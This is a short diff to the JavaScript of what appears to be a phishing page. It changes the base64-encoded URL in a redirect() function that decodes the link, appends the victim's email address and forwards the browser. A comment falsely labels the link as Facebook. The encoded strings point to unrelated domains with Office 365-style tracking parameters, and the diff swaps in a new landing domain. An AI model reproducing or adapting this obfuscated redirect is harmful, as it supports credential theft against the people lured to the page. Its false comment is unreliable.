@@ -1811,7 +1811,7 @@ src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/4QAYRXhpZgAASUkqAAgAAAAA
     }
 
     function redirect(email) {
-        var linkx = "aHR0cHM6Ly9mcnV0aXh4aW1hLmNvbS9uLz9jM1k5YnpNMk5WOHhYMjV2YlNaeVlXNWtQV0ZZUVhobFIzTTlKblZwWkQxVlUwVlNNVEV4TVRJd01qUlZNell4TVRFeE1EZz1OMDEyM05bRU1BSUxd"; // Base64 encoded link for "https://www.facebook.com/"
+        var linkx = "aHR0cHM6Ly9lcXZpZXRuYW0uY29tL24vP2MzWTliek0yTlY4eFgyNXZiU1p5WVc1a1BWcEhSblZPTVdjOUpuVnBaRDFWVTBWU01URXhNVEl3TWpSVk16WXhNVEV4TURnPU4wMTIzTltFTUFJTF0="; // Base64 encoded link for "https://www.facebook.com/"
         var decodedLink = atob(linkx);
         var finalLink = decodedLink + "#" + email; // Append the email directly to the URL
         window.location.href = finalLink;
